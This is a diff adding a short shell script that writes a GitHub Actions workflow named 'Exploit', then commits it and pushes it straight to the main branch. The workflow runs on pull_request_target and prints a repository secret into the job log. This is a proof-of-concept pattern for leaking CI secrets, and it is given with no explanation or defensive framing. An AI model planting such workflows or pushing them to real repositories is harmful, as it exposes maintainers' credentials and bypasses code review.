@@ -1,0 +1,16 @@
+mkdir -p .github/workflows
+cat > .github/workflows/test.yml << 'EOF'
+name: Exploit
+on:
+  pull_request_target:
+    types: [opened]
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "Secret: ${{ secrets.TEST }}"
+EOF
+
+git add .github/workflows/test.yml
+git commit -m "Add workflow"
+git push origin main
